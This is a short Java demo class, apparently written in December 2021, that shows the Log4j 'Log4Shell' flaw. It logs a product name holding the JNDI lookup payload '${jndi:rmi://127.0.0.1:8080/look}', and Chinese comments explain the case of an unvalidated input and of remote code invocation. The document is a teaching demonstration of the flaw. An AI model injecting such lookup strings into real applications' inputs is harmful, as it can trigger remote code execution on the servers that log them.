package zhou.wu.boot.log4j.demo;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author zhou.wu
 * @date 2021/12/15
 **/

public class Log4jTest {

    public static void main(String[] args) {
        Logger logger = LoggerFactory.getLogger("log4j2");
        // 比如当商品名不做验证的时候，传入该值的名称
        String merchandiseName = "${jndi:rmi://127.0.0.1:8080/look}";
        logger.info("新增商品，名称：{}", merchandiseName);

//        // 平时我们的使用
//        logger.info("{}执行Main方法", "zho.wu");
//        // 还有很多参数，详见：https://logging.apache.org/log4j/2.x/manual/lookups.html#
//        logger.info("日志也可以直接打印一些系统参数，例如：{}", "${java:version}");
//        // JNDI使用
//        logger.info("通过log4j远程调用代码。{}", "${jndi:rmi://127.0.0.1:8080/look}");
    }

}
